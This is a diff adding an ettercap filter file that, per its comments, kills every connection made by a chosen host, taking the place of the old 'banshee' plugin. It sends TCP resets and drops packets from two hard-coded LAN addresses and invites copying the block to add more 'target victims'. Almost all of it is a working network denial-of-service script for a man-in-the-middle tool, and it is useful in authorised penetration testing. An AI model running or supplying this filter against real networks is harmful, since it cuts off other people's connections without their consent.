@@ -1,0 +1,33 @@
+############################################################################
+#                                                                          #
+#  ettercap -- etter.filter -- filter source file                          #
+#                                                                          #
+#  Copyright (C) ALoR & NaGA                                               #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+##
+#
+#   This filter will kill all the connection made by an host.
+#   this can be used instead of the old 'banshee' plugin.
+#   if you need to add target victims, simply copy the code as many time you
+#   want
+##
+
+if (ip.src == '192.168.1.1') {
+# sent the RST to both source and dest
+   kill();
+# don't even forward the packet
+   drop();
+}
+
+if (ip.src == '192.168.1.2') {
+   kill();
+   drop();
+}
+
